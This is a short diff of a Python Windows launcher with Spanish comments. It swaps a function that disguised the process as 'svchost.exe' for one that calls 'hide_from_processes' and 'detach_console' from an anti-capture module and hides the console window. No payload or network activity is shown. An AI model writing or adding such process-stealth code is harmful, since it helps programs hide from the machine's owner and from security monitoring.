@@ -9,19 +9,27 @@ def hide_console():
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
             ctypes.windll.user32.ShowWindow(hwnd, 0)
-    except:
+    except Exception:
         pass
 
-def rename_process():
+def apply_process_stealth():
+    """Aplica todas las tecnicas de stealth de proceso al inicio."""
     try:
-        kernel32 = ctypes.windll.kernel32
-        kernel32.SetProcessNameW("svchost.exe")
-    except:
+        from core.anti_capture import hide_from_processes, detach_console
+        hide_from_processes()
+        detach_console()
+    except Exception:
+        pass
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+    except Exception:
         pass
 
 def main():
     hide_console()
-    rename_process()
+    apply_process_stealth()
 
     os.chdir(APP_DIR)
     sys.path.insert(0, APP_DIR)
